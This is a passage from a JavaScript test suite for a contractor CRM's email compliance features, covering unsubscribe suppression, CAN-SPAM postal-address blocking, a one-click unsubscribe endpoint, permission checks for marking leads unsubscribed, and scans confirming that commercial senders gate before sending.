  // the NBD owner uid — 2026-10-05). These fixtures are NBD's leads.
  const NBD_D = process.env.NBD_OWNER_UID || '1phDvAVXHSg82wDLegAbQFq14Ci1';
  {
    const card = (companyId) => [{ id: 'crm-1', data: { stage: 'new', status: 'new', companyId } }];
    const { mod, w } = load('lead-followup.js', {
      docs: Object.assign(withPostal(NBD_D), { ['email_suppressions/' + NBD_D + '__' + sha('no@example.com')]: { companyId: NBD_D } }),
      queries: {
        estimate_leads: [
          { id: 'p-supp', data: { email: 'no@example.com', firstName: 'N', companyId: NBD_D } },
          { id: 'p-ok', data: { email: 'yes@example.com', firstName: 'Y', companyId: NBD_D } },
        ],
        leads: () => card(NBD_D),
      },
    });
    await mod.leadFollowUpSweep.__handler({});
    ok('suppressed homeowner: no follow-up email', !w.sends.some((m) => m.to === 'no@example.com'));
    ok('suppressed homeowner: stamped followUpEmailSuppressedAt, NOT followUpEmailSentAt',
      !!w.docs['estimate_leads/p-supp'].followUpEmailSuppressedAt && !w.docs['estimate_leads/p-supp'].followUpEmailSentAt);
    const m = w.sends.find((x) => x.to === 'yes@example.com');
    ok('clean homeowner: sent with one-click headers + footer (html and text)',
      !!m && m.headers['List-Unsubscribe-Post'] === 'List-Unsubscribe=One-Click' && /\/unsubscribe\//.test(m.html) && /\/unsubscribe\//.test(m.text));
    const tokPath = Object.keys(w.docs).find((p) => p.startsWith('email_unsub_tokens/'));
    ok('token filed under the CRM card\'s tenant with the CRM leadId',
      !!tokPath && w.docs[tokPath].companyId === NBD_D && w.docs[tokPath].leadId === 'crm-1');
  }

  {
    const { mod, w } = load('lead-followup.js', {
      queries: {
        estimate_leads: [{ id: 'p-np', data: { email: 'np@example.com', firstName: 'N', companyId: NBD_D } }],
        leads: () => [{ id: 'crm-2', data: { stage: 'new', status: 'new', companyId: NBD_D } }],
      },
    });
    await mod.leadFollowUpSweep.__handler({});
    ok('CAN-SPAM: tenant with no postal address → follow-up NOT sent', w.sends.length === 0);
    ok('...not stamped sent or suppressed', !w.docs['estimate_leads/p-np'].followUpEmailSentAt && !w.docs['estimate_leads/p-np'].followUpEmailSuppressedAt);
    const done = w.logs.info.find((a) => a[0] === 'leadFollowUp: sweep done');
    ok('...and counted: sweep done blockedNoAddress === 1', !!done && done[1].blockedNoAddress === 1, JSON.stringify(done));
  }

  // ═══ E. emailUnsubscribe ═══════════════════════════════════════════════
  console.log('E. emailUnsubscribe endpoint');
  const TOKEN = 'A'.repeat(20) + 'b_c-' + 'D'.repeat(19); // 43 chars
  const TOKDOCS = () => ({
    ['email_unsub_tokens/' + TOKEN]: { companyId: 'co-a', email: HOMEOWNER.toLowerCase(), leadId: 'lead-1', source: 'sendEmail' },
    'companyProfile/co-a': { brand: { legalName: 'Acme Roofing LLC' } },
  });
  async function hit(method, opts, extra) {
    const { mod, w } = load('email-unsubscribe.js', Object.assign({ docs: TOKDOCS() }, opts || {}));
    const res = await invoke(mod.emailUnsubscribe.__handler, Object.assign({
      method, path: '/unsubscribe/' + TOKEN, headers: {}, body: {},
    }, extra || {}));
    return { res, w, mod };
  }
  const supWrites = (w) => w.writes.filter((x) => x.path.startsWith('email_suppressions/'));
  {
    const { res, w } = await hit('GET');
    ok('GET valid token → 200 confirm page with the TENANT\'s name and a masked address',
      res.statusCode === 200 && /Acme Roofing LLC/.test(res.body) && /sa\*\*\*@e\*\*\*\.com/.test(res.body) && !/Sam\.Homeowner/i.test(res.body));
    ok('GET renders a POST form (no script)', /<form method="post">/.test(res.body) && !/<script/i.test(res.body));
    ok('GET has NO side effect (no write of any kind)', w.writes.length === 0, JSON.stringify(w.writes));
    ok('page is no-store, noindex, no-referrer', res.headers['Cache-Control'] === 'private, no-store'
      && /noindex/.test(res.headers['X-Robots-Tag']) && res.headers['Referrer-Policy'] === 'no-referrer');
  }
  {
    const { res, w } = await hit('HEAD');
    ok('HEAD: 200, empty body, no write', res.statusCode === 200 && res.body === '' && w.writes.length === 0);
  }
  {
    const { res, w } = await hit('POST', null, { body: { 'List-Unsubscribe': 'One-Click', via: 'page' } });
    const s = supWrites(w);
    ok('POST from the page → 200 "You\'re unsubscribed"', res.statusCode === 200 && /You&#39;re unsubscribed|You're unsubscribed/.test(res.body));
    ok('...records ONE suppression under the token\'s tenant, source link',
      s.length === 1 && s[0].path === SUP_A && s[0].data.source === 'link' && s[0].data.companyId === 'co-a'
      && s[0].data.email === HOMEOWNER.toLowerCase() && s[0].data.emailHash === sha(HOMEOWNER) && s[0].data.leadId === 'lead-1');
    ok('...and nothing is written under any other tenant', !w.writes.some((x) => x.path === SUP_B));
  }
  {
    // RFC 8058: the mailbox provider POSTs "List-Unsubscribe=One-Click" as the
    // raw body (the SDK may not parse it — string/rawBody both handled).
    const { res, w } = await hit('POST', null, { body: 'List-Unsubscribe=One-Click', rawBody: Buffer.from('List-Unsubscribe=One-Click') });
    const s = supWrites(w);
    ok('RFC 8058 one-click POST → 200 + suppression recorded, source one_click',
      res.statusCode === 200 && s.length === 1 && s[0].data.source === 'one_click');
  }
  {
    const docs = Object.assign(TOKDOCS(), { [SUP_A]: { companyId: 'co-a', source: 'rep', createdAt: 'first' } });
    const { res, w } = await hit('POST', { docs }, { body: { via: 'page' } });
    ok('idempotent: a second POST answers 200 and leaves the first record untouched',
      res.statusCode === 200 && supWrites(w).length === 0 && w.docs[SUP_A].source === 'rep' && w.docs[SUP_A].createdAt === 'first');
    const g = await hit('GET', { docs });
    ok('GET after unsubscribing says "already unsubscribed" (still no write)',
      /already unsubscribed/.test(g.res.body) && g.w.writes.length === 0);
  }
  for (const [label, p] of [['garbage token', '/unsubscribe/not-a-token'], ['empty path', '/unsubscribe/'],
    ['unknown well-formed token', '/unsubscribe/' + 'Z'.repeat(43)]]) {
    const { res, w } = await hit('POST', null, { path: p, body: { via: 'page' } });
    ok(label + ' → neutral 404, no tenant name, no write',
      res.statusCode === 404 && /isn&#39;t valid|isn't valid/.test(res.body) && !/Acme/.test(res.body) && w.writes.length === 0);
  }
  {
    const { res } = await hit('DELETE');
    ok('other methods → 405', res.statusCode === 405);
  }
  {
    const { res, w } = await hit('POST', { limited: ['emailUnsub:ip'] }, { body: { via: 'page' } });
    ok('per-IP rate limit → 429 page, nothing recorded', res.statusCode === 429 && w.writes.length === 0);
  }
  {
    const { res } = await hit('POST', { writeThrows: (p) => p.startsWith('email_suppressions/') }, { body: { via: 'page' } });
    ok('a failed write is NOT reported as unsubscribed (503)', res.statusCode === 503 && !/You&#39;re unsubscribed/.test(res.body));
  }
  {
    const { mod } = load('email-unsubscribe.js');
    const src = fs.readFileSync(path.join(FUNCTIONS, 'email-unsubscribe.js'), 'utf8');
    ok('emailUnsubscribe declared with memory >= 256MiB and no enforceAppCheck',
      mod.emailUnsubscribe.__opts.memory === '256MiB' && !('enforceAppCheck' in mod.emailUnsubscribe.__opts));
    ok('deploy workflow will find it (exports.X = onRequest( / onCall( at line start)',
      /^exports\.emailUnsubscribe = onRequest\(/m.test(src) && /^exports\.markEmailUnsubscribed = onCall\(/m.test(src));
    const fb = JSON.parse(fs.readFileSync(path.join(ROOT, 'firebase.json'), 'utf8'));
    ok('firebase.json rewrites /unsubscribe/** to emailUnsubscribe',
      fb.hosting.rewrites.some((r) => r.source === '/unsubscribe/**' && r.function && r.function.functionId === 'emailUnsubscribe'));
    const idx = fs.readFileSync(path.join(FUNCTIONS, 'index.js'), 'utf8');
    ok('index.js exports the module', /require\('\.\/email-unsubscribe'\)/.test(idx));
  }

  // ═══ F. markEmailUnsubscribed ══════════════════════════════════════════
  console.log('F. markEmailUnsubscribed');
  async function mark(auth, leadDoc) {
    const { mod, w } = load('email-unsubscribe.js', { docs: { 'leads/L1': leadDoc } });
    let err = null, out = null;
    try { out = await mod.markEmailUnsubscribed.__handler({ auth, data: { leadId: 'L1' } }); } catch (e) { err = e; }
    return { err, out, w };
  }
  const LEAD = { userId: 'rep-a', companyId: 'co-a', email: HOMEOWNER };
  {
    const { err, w } = await mark({ uid: 'rep-a', token: { companyId: 'co-a', role: 'sales_rep' } }, LEAD);
    const s = supWrites(w);
    ok('lead owner marks: suppression under co-a, source rep, byUid',
      !err && s.length === 1 && s[0].path === SUP_A && s[0].data.source === 'rep' && s[0].data.byUid === 'rep-a', err && err.message);
  }
  {
    const { err } = await mark({ uid: 'mgr-a', token: { companyId: 'co-a', role: 'manager' } }, LEAD);
    ok('same-company manager may mark', !err);
  }
  {
    const { err, w } = await mark({ uid: 'rep-b', token: { companyId: 'co-b', role: 'company_admin' } }, LEAD);
    ok('another tenant\'s company_admin is refused', err && err.code === 'permission-denied' && w.writes.length === 0);
  }
  {
    const { err } = await mark({ uid: 'rep-x', token: { companyId: 'co-a', role: 'sales_rep' } }, LEAD);
    ok('a same-company rep who does not own the lead is refused', err && err.code === 'permission-denied');
  }
  {
    const { err } = await mark({ uid: 'rep-a', token: { companyId: 'co-a', role: 'viewer' } }, LEAD);
    ok('viewer refused', err && err.code === 'permission-denied');
  }
  {
    const { err } = await mark(null, LEAD);
    ok('unauthenticated refused', err && err.code === 'unauthenticated');
  }

  // ═══ G. classification registry ════════════════════════════════════════
  console.log('G. every send site is classified');
  {
    delete require.cache[path.join(FUNCTIONS, 'email-suppression.js')];
    world = null;
    const S = require(path.join(FUNCTIONS, 'email-suppression.js'));
    // Both scans below grep for an identifier, so they must only ever see
    // CODE. The original pass used a raw readFileSync for the gate check, and
    // `// TODO: call gateCommercialEmail( db, ... ) here one day` satisfied it
    // — a commercial sender that never gated anything shipped green. Found and
    // mutation-verified by the 2026-09-22 close-out audit.
    //
    // Line-oriented on purpose. A character-level stripper that also removes
    // string literals has to tell a regex literal from a division, and
    // `/['"]/` in this corpus opened a phantom string that swallowed ten real
    // send sites. This one only ever cuts comments, so the failure direction
    // is bounded: over-stripping trips `stale` (a SEND_PATHS entry stops being
    // found) and fails LOUDLY; it cannot produce a silent pass.
    function stripCode(src) {
      const lines = String(src).split('\n');
      const out = [];
      let inBlock = false;
      for (let raw of lines) {
        let line = raw;
        if (inBlock) {
          const end = line.indexOf('*/');
          if (end === -1) { out.push(''); continue; }
          line = line.slice(end + 2);
          inBlock = false;
        }
        const t = line.trim();
        if (t.startsWith('//')) { out.push(''); continue; }
        if (t.startsWith('/*')) {
          const open = line.indexOf('/*');
          const end = line.indexOf('*/', open + 2);
          if (end === -1) { inBlock = true; out.push(''); continue; }
          line = line.slice(0, open) + line.slice(end + 2);
        }
        // Trailing `// comment`, skipping the `://` of a URL.
        let idx = -1, from = 0;
        while ((idx = line.indexOf('//', from)) !== -1) {
          if (idx > 0 && line[idx - 1] === ':') { from = idx + 2; continue; }
          break;
        }
        if (idx !== -1) line = line.slice(0, idx);
        out.push(line);
      }
      return out.join('\n');
    }
    // The stripper IS the guard here, so prove it strips before trusting it.
    ok('stripCode removes a whole-line commented gate call',
      !/gateCommercialEmail\(/.test(stripCode('  // call gateCommercialEmail( db )\nfoo();')));
    ok('stripCode removes a trailing commented gate call',
      !/gateCommercialEmail\(/.test(stripCode('foo(); // later: gateCommercialEmail( db )')));
    ok('stripCode removes a block-commented gate call',
      !/gateCommercialEmail\(/.test(stripCode('/* TODO\n * gateCommercialEmail( db )\n */\nfoo();')));
    ok('stripCode keeps a real gate call',
      /gateCommercialEmail\(/.test(stripCode('const g = await S.gateCommercialEmail(db, {});')));
    ok('stripCode keeps code that merely contains a URL',
      /\.emails\.send\(/.test(stripCode('// see https://resend.com/docs\nawait resend.emails.send(m);')));

    const files = [];
    const code = new Map();
    (function walk(dir) {
      for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
        if (e.name === 'node_modules' || e.name.startsWith('.')) continue;
        const p = path.join(dir, e.name);
        if (e.isDirectory()) walk(p);
        else if (e.name.endsWith('.js')) {
          const stripped = stripCode(fs.readFileSync(p, 'utf8'));
          if (/\.emails\.send\(/.test(stripped)) {
            const rel = path.relative(FUNCTIONS, p).replace(/\\/g, '/');
            files.push(rel);
            code.set(rel, stripped);
          }
        }
      }
    })(FUNCTIONS);
    ok('scan found the send sites (non-vacuous: >= 15 files)', files.length >= 15, files.join(','));
    const missing = files.filter((f) => !S.SEND_PATHS[f]);
    ok('every file that calls resend.emails.send() is in SEND_PATHS (missing: ' + (missing.join(', ') || 'none') + ')', missing.length === 0);
    const stale = Object.keys(S.SEND_PATHS).filter((f) => !files.includes(f));
    ok('no stale SEND_PATHS entries (' + (stale.join(', ') || 'none') + ')', stale.length === 0);
    const commercial = Object.keys(S.SEND_PATHS).filter((f) => ['commercial', 'mixed'].includes(S.SEND_PATHS[f]));
    const ungated = commercial.filter((f) => !/gateCommercialEmail\(/.test(code.get(f) || ''));
    ok('every commercial/mixed sender calls gateCommercialEmail in CODE, not a comment ('
      + (ungated.join(', ') || 'all do') + ')', ungated.length === 0);
    // Presence is not enough: the gate has to run BEFORE the send it guards.
    // A gate bolted on after resend.emails.send() reads as "gated" to any
    // grep and stops nothing.
    const gateAfterSend = commercial.filter((f) => {
      const src = code.get(f) || '';
      const g = src.indexOf('gateCommercialEmail(');
      const s = src.indexOf('.emails.send(');
      return g === -1 || s === -1 || g > s;
    });
    ok('every commercial/mixed sender gates BEFORE its first send ('
      + (gateAfterSend.join(', ') || 'all do') + ')', gateAfterSend.length === 0);
  }

  // ═══ H. browser client ═════════════════════════════════════════════════
  console.log('H. NBDComms.sendEmail + email_system');
  {
    const SRC = fs.readFileSync(path.join(ROOT, 'docs/pro/js/nbd-comms.js'), 'utf8');
    function loadComms(respond) {
      const toasts = [], opened = [], posts = [];
      const window = {
        _user: { getIdToken: async () => 'id' },
        showToast: (msg, type) => toasts.push({ msg, type }),
        dispatchEvent() {},
        location: { get href() { return 'https://x/pro/customer.html'; }, set href(v) { opened.push(v); } },
      };
      const document = {
        createElement: () => { const a = { style: {}, remove() {} }; a.click = () => opened.push(a.href); return a; },
        body: { appendChild() {} }, addEventListener() {},
      };
      const sandbox = {
        window, document, console, location: { hostname: 'nobigdealwithjoedeal.com' },
        fetch: async (url, init) => { posts.push({ url, body: JSON.parse(init.body) }); return respond(); },
        AbortController, setTimeout, clearTimeout, CustomEvent: function () {},
      };
      vm.createContext(sandbox);
      vm.runInContext(SRC, sandbox, { filename: 'nbd-comms.js' });
      return { C: window.NBDComms, toasts, opened, posts };
    }
    const jsonRes = (status, body) => () => ({ ok: status >= 200 && status < 300, status, json: async () => body });
    let h = loadComms(jsonRes(403, { error: 'This person unsubscribed from email', code: 'unsubscribed' }));
    let r = await h.C.sendEmail({ to: 'a@b.co', subject: 's', body: 'b', leadId: 'L' });
    ok('403 unsubscribed → final refusal (success:false, mode:platform, error unsubscribed)',
      r.success === false && r.mode === 'platform' && r.error === 'unsubscribed');
    ok('...no mailto: opened', h.opened.length === 0);
    ok('...rep sees "This person unsubscribed from email"', h.toasts.some((t) => t.type === 'error' && /unsubscribed from email/.test(t.msg)));
    h = loadComms(jsonRes(503, { error: 'Could not confirm…', code: 'suppression_unverified' }));
    r = await h.C.sendEmail({ to: 'a@b.co', subject: 's', body: 'b' });
    ok('503 suppression_unverified → refusal, no mailto:', r.success === false && r.mode === 'platform' && h.opened.length === 0);
    h = loadComms(jsonRes(200, { success: true, id: 'e1' }));
    await h.C.sendEmail({ to: 'a@b.co', subject: 's', body: 'b', kind: 'invoice' });
    await h.C.sendEmail('a@b.co', 's', 'b', { kind: 'appointment' });
    await h.C.sendEmail({ to: 'a@b.co', subject: 's', body: 'b' });
    ok('kind reaches the server in both call shapes; omitted when unset (= commercial)',
      h.posts[0].body.kind === 'invoice' && h.posts[1].body.kind === 'appointment' && !('kind' in h.posts[2].body));
    ok('stage kinds: appointment confirmations + cash estimate transactional, others commercial',
      h.C.emailKindForStage('crew_scheduled') === 'appointment' && h.C.emailKindForStage('adjuster_meeting_scheduled') === 'appointment'
      && h.C.emailKindForStage('estimate_sent_cash') === 'estimate' && h.C.emailKindForStage('contacted') === null
      && h.C.emailKindForStage('toString') === null);

    // email_system.js window.sendEmail (the compose modal), run for real: the
    // function is cut out by brace matching and handed stubbed globals.
    const ES = fs.readFileSync(path.join(ROOT, 'docs/pro/js/email_system.js'), 'utf8');
    function cut(src, startNeedle) {
      const start = src.indexOf(startNeedle);
      if (start < 0) throw new Error('not found: ' + startNeedle);
      const open = src.indexOf('{', src.indexOf(')', start));
      let depth = 0;
      for (let j = open; j < src.length; j++) {
        if (src[j] === '{') depth++;
        else if (src[j] === '}' && --depth === 0) return src.slice(start, j + 1);
      }
      throw new Error('unbalanced');
    }
    const kindSrc = cut(ES, 'window.emailSystem.kindForContext = function');
    const sendSrc = cut(ES, 'window.sendEmail = async function');
    async function modalSend(context, commsResult) {
      const calls = [], hrefs = [], addDocs = [];
      const win = {
        emailSystem: {},
        NBDComms: {
          sendEmail: async (...a) => { calls.push(a); return commsResult; },
          emailKindForStage: (st) => (st === 'crew_scheduled' ? 'appointment' : null),
        },
        db: {}, auth: { currentUser: { uid: 'u1', email: 'r@x' } },
        addDoc: async (c, d) => { addDocs.push(d); }, collection: () => 'emails', serverTimestamp: () => 'ts',
        location: { set href(v) { hrefs.push(v); }, get href() { return ''; } },
      };
      const docStub = { getElementById: (id) => ({ value: { emailTo: 'h@x.co', emailSubject: 'S', emailBody: 'B' }[id] }) };
      const f = new Function('window', 'document', '_emailLeadId', '_emailContext', '_emailAttachment', 'closeEmailModal', 'showToast', 'alert', 'setTimeout',
        kindSrc + ';\n' + sendSrc + ';\nreturn window.sendEmail;');
      const fn = f(win, docStub, 'lead-1', context, null, () => {}, () => {}, () => {}, () => {});
      await fn();
      return { calls, hrefs, addDocs };
    }
    let m = await modalSend('followUp', { success: false, mode: 'platform', error: 'unsubscribed' });
    ok('compose modal: a platform refusal opens NO mailto: and writes no fallback log',
      m.hrefs.length === 0 && m.addDocs.length === 0, JSON.stringify(m.hrefs));
    m = await modalSend('followUp', { success: false, mode: 'mailto', error: 'no-subject' });
    ok('compose modal (control): a non-platform failure still falls back to mailto:', m.hrefs.some((u) => /^mailto:/.test(u)));
    m = await modalSend('estimate', { success: true, mode: 'platform' });
    const k1 = m.calls[0][3].kind;
    m = await modalSend('followUp', { success: true, mode: 'platform' });
    const k2 = m.calls[0][3].kind;
    m = await modalSend('stage_crew_scheduled', { success: true, mode: 'platform' });
    const k3 = m.calls[0][3].kind;
    m = await modalSend('photoReport', { success: true, mode: 'platform' });
    const k4 = m.calls[0][3].kind;
    ok('compose modal passes kind from its context (estimate/document/appointment transactional; follow-up commercial)',
      k1 === 'estimate' && k2 === null && k3 === 'appointment' && k4 === 'document', [k1, k2, k3, k4].join());
    const pins = [
      ['docs/pro/js/invoice-pipeline.js', /kind: 'invoice'/], ['docs/pro/js/invoice-pipeline.js', /kind: 'receipt'/],
      ['docs/pro/js/close-board.js', /kind: 'proposal'/], ['docs/pro/js/portal-link-helpers.js', /kind: 'portal_link'/],
    ];
    ok('transactional client callers declare their kind',
      pins.every(([f, re]) => re.test(fs.readFileSync(path.join(ROOT, f), 'utf8'))));
  }

  // ═══ I. the Mailing Address field is wired end to end ══════════════════
  // The server half is useless without a way for a contractor to SET the
  // address, and a dropped input here fails silently: email keeps sending,
  // just without the postal address CAN-SPAM requires. Pin all four points.
  console.log('I. Settings → Mailing Address wiring');
  {
    const dash = fs.readFileSync(path.join(ROOT, 'docs/pro/dashboard.html'), 'utf8');
    const boot = fs.readFileSync(path.join(ROOT, 'docs/pro/js/dashboard-bootstrap.module.js'), 'utf8');
    const prof = fs.readFileSync(path.join(ROOT, 'docs/pro/js/company-profile.js'), 'utf8');
    ok('dashboard.html has the #cp_brand_mailingAddress input',
      /id="cp_brand_mailingAddress"/.test(dash));
    ok('the collector writes contact.mailingAddress from that input',
      /cpv\('cp_brand_mailingAddress'\)/.test(boot) && /contact\.mailingAddress = cMailing/.test(boot));
    ok('the hydrator seeds the input from the saved profile',
      /setCp\('cp_brand_mailingAddress', rawContact\.mailingAddress/.test(boot));
    ok('mailingAddress is in _IDENTITY_CONTACT so no tenant inherits another\'s',
      /_IDENTITY_CONTACT\s*=\s*\[[^\]]*'mailingAddress'/.test(prof));
    // It must NOT be mirrored into the letterhead/microsite address: those are
    // a different disclosure decision (see the collector's comment).
    ok('mailingAddress is not mirrored into businessAddress / contact.address',
      !/businessAddress\s*=\s*cMailing/.test(boot) && !/contact\.address\s*=\s*cMailing/.test(boot));
  }

  console.log('\n──────────────────────────────────────────────────');
  console.log(`${passed} passed, ${failed} failed`);
  if (failed) {
    console.log('\nFailures:');
    fails.forEach((f) => console.log('  - ' + f));
    process.exit(1);
  }
})().catch((e) => {
  console.error('suite crashed:', (e && e.stack) || e);
  process.exit(1);
});
